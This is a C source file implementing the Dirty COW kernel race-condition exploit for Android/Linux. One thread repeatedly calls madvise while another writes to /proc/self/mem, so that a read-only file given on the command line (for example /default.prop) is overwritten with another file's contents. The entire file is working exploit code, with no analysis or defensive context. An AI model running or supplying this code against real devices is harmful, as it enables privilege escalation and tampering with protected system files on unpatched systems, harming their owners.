#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...) 
#endif

#define LOOP   0x100000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	unsigned char *offset;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	int do_patch;
};

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	/*addr = (void *)((off_t)mem_arg->offset & (~(PAGE_SIZE - 1)));*/
	/*size = mem_arg->offset - (unsigned long)addr;*/
	/*size = mem_arg->patch_size + (mem_arg->offset - addr);*/
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %d", addr, size);

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	LOGV("[*] madvise = %d %d", c, i);
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGV("open(\"/proc/self/mem\"");

	for (i = 0; i < LOOP; i++) {
		lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);
	}

	LOGV("[*] /proc/self/mem %d %i", c, i);

	close(fd);

	return NULL;
}

static void exploit(struct mem_arg *mem_arg, int do_patch)
{
	pthread_t pth1, pth2;

	LOGV("[*] exploit (%s)", do_patch ? "patch": "unpatch");
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		LOGV("usage %s /default.prop /data/local/tmp/default.prop", argv[0]);
		return 0;
	}

	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f=open(argv[1],O_RDONLY);
	if (f == -1) {
		LOGV("could not open %s", argv[1]);
		return 0;
	}
	if (fstat(f,&st) == -1) {
		LOGV("could not open %s", argv[1]);
		return 0;
	}

	int f2=open(argv[2],O_RDONLY);
	if (f2 == -1) {
		LOGV("could not open %s", argv[2]);
		return 0;
	}
	if (fstat(f2,&st2) == -1) {
		LOGV("could not open %s", argv[2]);
		return 0;
	}

	size_t size = st.st_size;
	if (st2.st_size != st.st_size) {
		LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st2.st_size, st.st_size);
		if (st2.st_size > size) {
			size = st2.st_size;
		}
	}

	LOGV("size %d\n\n",size);

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL)
		LOGV("malloc");

	memset(mem_arg.patch, 0, size);

	mem_arg.unpatch = malloc(size);
	if (mem_arg.unpatch == NULL)
		LOGV("malloc");

	read(f2, mem_arg.patch, st2.st_size);
	close(f2);

	/*read(f, mem_arg.unpatch, st.st_size);*/

	mem_arg.patch_size = size;
	mem_arg.do_patch = 1;

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
		return 0;
	}

	LOGV("[*] mmap %p", map);

	mem_arg.offset = map;

	exploit(&mem_arg, 1);

	close(f);
	// to put back
	/*exploit(&mem_arg, 0);*/

	return 0;
}